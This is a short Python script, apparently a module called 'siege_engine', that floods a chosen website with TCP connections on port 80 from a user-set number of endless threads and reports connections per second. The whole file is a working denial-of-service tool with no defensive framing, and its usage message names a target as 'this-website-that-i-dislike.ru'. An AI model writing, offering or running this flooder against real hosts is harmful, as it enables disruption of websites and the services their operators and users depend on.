import socket
import threading
import time
import sys

connections = 0

def flood_tcp(host: str):
    global connections
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((host, 80))
        time.sleep(3)
        sock.close()
        connections += 1
    except (socket.error, socket.timeout):
        pass


class DoYourThing(threading.Thread):
    def __init__(self, hostname: str):
        self.hostname = hostname
        super().__init__()

    def run(self):
        while True:
            flood_tcp(self.hostname)


def run():
    global connections
    if len(sys.argv) < 3:
        print('Correct usage is python -m siege_engine number-of-threads-you-want-to-ping this-website-that-i-dislike.ru')
        sys.exit(1)
    amount, hostname = sys.argv[1:]
    print('Pinging %s on %s threads' % (hostname, amount))
    amount = int(amount)
    now = (time.time())
    for _ in range(amount):
        DoYourThing(hostname).start()
    while True:
        if int(time.time()) != now:
            now = int(time.time())
            print('Last seconds made', connections, 'calls which involved', connections*24, 'wasted bytes on the behalf of',
                  hostname)
            connections = 0
